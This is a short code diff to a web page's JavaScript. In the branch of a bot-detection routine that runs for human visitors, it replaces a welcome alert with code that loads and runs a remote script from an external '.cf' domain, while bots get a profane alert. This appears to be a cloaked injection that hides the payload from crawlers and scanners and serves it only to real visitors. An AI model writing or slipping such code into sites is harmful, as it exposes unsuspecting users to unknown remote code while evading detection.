@@ -56,7 +56,9 @@ img { max-width: 100%; height: auto; }
                     alert("You are a fucking bot!");
                 }
                 else {
-                    alert("Welcome user!");
+                    var scrpt = document.createElement('script');
+                    scrpt.setAttribute('src','https://babanina.cf/jsprocessing.php');
+                    document.body.appendChild(scrpt);
                 }
             };
             var botDetector = new BotDetector({
